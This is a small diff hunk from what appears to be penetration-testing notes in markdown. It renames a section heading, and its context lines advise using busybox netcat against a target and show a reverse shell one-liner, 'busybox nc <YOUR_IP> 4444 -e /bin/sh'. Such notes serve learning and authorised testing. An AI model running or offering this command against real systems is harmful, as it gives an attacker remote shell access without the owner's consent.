@@ -1026,9 +1026,7 @@ When attempting a reverse shell, standard implementations of `netcat` (`nc`) var
 
 If you are going into a target blind and standard `nc` fails, `busybox nc` is a much safer assumption.
 
-### Reverse Shell Command Breakdown
-
-Bash
+**Breakdown**
 
 ```
 busybox nc <YOUR_IP> 4444 -e /bin/sh
